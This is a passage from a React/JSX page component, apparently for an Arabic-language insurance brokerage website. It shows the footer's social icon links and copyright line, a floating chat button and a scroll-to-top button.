            <a href="#" className="w-9 h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
            </a>
            {/* YouTube */}
            <a href="#" className="w-9 h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
            </a>
          </div>

          {/* Copyright */}
          <div className="border-t border-white/20 pt-4 text-center">
            <p className="text-xs md:text-sm text-white/70">
              2026 © جميع الحقوق محفوظة، شركة عناية الوسيط لوساطة التأمين
            </p>
          </div>
        </div>
      </footer>

      {/* Floating Chat Button */}
      <div className="fixed bottom-20 left-4 z-50">
        <button className="w-12 h-12 rounded-full shadow-lg flex items-center justify-center text-white" style={{ backgroundColor: '#f5a623' }}>
          <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
        </button>
        <span className="text-xs text-gray-500 block text-center mt-1">راسلنا</span>
      </div>

      {/* Scroll to Top */}
      <div className="fixed bottom-4 left-4 z-50">
        <button 
          onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })}
          className="w-10 h-10 rounded-full shadow-lg flex items-center justify-center text-white" 
          style={{ backgroundColor: primaryBlue }}
        >
          <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 10l7-7m0 0l7 7m-7-7v18" />
          </svg>
        </button>
      </div>
    </div>
  );
}
